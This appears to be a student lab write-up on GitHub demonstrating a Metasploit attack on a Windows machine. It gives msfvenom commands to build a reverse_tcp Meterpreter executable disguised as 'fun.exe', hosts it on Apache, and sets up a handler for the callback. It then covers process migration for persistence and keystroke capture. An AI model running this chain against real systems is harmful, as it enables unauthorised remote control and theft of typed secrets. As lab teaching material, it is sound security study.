# Compromising-windows-using-Metasploit
Compromising windows using Metasploit
# Metasploit
Compromising windows using Metasploit

# AIM:

To Compromise windows using Metasploit .

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode

### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## PROGRAM:

Find the attackers ip address using ifconfig

## Output

![5 1](https://github.com/Kaviarasu510/Compromising-windows-using-Metasploit/assets/119392695/4c70ff7b-e2a9-4de7-baff-bfa8fa285bd4)

Create a malicious executable file fun.exe using msfvenom command

msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe

## OUTPUT

![6 1](https://github.com/Kaviarasu510/Compromising-windows-using-Metasploit/assets/119392695/77056188-0200-4e1b-98f7-900ec670583d)

copy the fun.exe into the apache /var/www/html folder

![6 2](https://github.com/Kaviarasu510/Compromising-windows-using-Metasploit/assets/119392695/31792d82-b15a-450d-af2b-8d198c85b3fc)

Start apache server

sudo systemctl apache2 start

![6 3](https://github.com/Kaviarasu510/Compromising-windows-using-Metasploit/assets/119392695/83531563-5f64-4b7d-9b1a-5776abf2bda9)

Check the status of apache2

![6 4](https://github.com/Kaviarasu510/Compromising-windows-using-Metasploit/assets/119392695/c0ad6f2d-d384-4523-bcf7-6a0f05860b2a)

Invoke msfconsole:

## OUTPUT:
![5 2](https://github.com/Kaviarasu510/Compromising-windows-using-Metasploit/assets/119392695/a46ec40d-1121-4679-83ca-6b4d648e5ae1)

Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.
![5 3](https://github.com/Kaviarasu510/Compromising-windows-using-Metasploit/assets/119392695/fd51aff2-28e5-4683-9881-89b2eeab5d73)

Starting a command and control Server

use multi/handler

set PAYLOAD windows/meterpreter/reverse_tcp

set LHOST 0.0.0.0

exploit

![6 5](https://github.com/Kaviarasu510/Compromising-windows-using-Metasploit/assets/119392695/9a24cf63-39b7-49b6-997d-40dc5f6fd9ce)

On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine:

http://192.168.1.2/fun.exe

The file "fun.exe" downloads.

![6 6](https://github.com/Kaviarasu510/Compromising-windows-using-Metasploit/assets/119392695/a0c69149-263a-4965-9450-2f4d9bd01fcb)

On kali give the command exploit

![6 7](https://github.com/Kaviarasu510/Compromising-windows-using-Metasploit/assets/119392695/6d3ad5d6-327f-4efc-82c1-483ebe61d3e9)

To see a list of processes, at the meterpreter > prompt, execute this command:

ps  ⇒ can see the fun.exe process running with pid 1156
![6 8](https://github.com/Kaviarasu510/Compromising-windows-using-Metasploit/assets/119392695/2a82d73f-bd85-40fa-8423-7fbd6560dd4e)

The Metasploit shell is running inside the "fun.exe" process. If the user closes that process, or logs off, the connection will be lost.

To become more persistent, we'll migrate to a process that will last longer.

Let's migrate to the winlogon process.

At the meterpreter > prompt, execute this command:

migrate -N explorer.exe

at meterpreter > prompt, execute this command:

netstat

A list of network connections appears, including one to a remote port of 4444, as highlighted in the image below.

Notice the "PID/Program name" value for this connection, which is redacted 

![6 9](https://github.com/Kaviarasu510/Compromising-windows-using-Metasploit/assets/119392695/880f7f10-8ad9-4006-af3c-ce6a4da69450)

Post Exploitation

The target is now owned. Following are meterpreter commands for key capturing in the target machine

keyscan_start	Begins capturing keys typed in the target. On the Windows target, open Notepad and type in some text, such as your name.
![6 10](https://github.com/Kaviarasu510/Compromising-windows-using-Metasploit/assets/119392695/222291fd-7f26-4af0-b959-751a906fd095)

keyscan_dump	Shows the keystrokes captured so far

![6 12](https://github.com/Kaviarasu510/Compromising-windows-using-Metasploit/assets/119392695/2a4a7d88-f299-4c28-9e35-e88e1c13d1e8)

## RESULT:
The Metasploit framework is  used to compromise windows and is examined successfully.
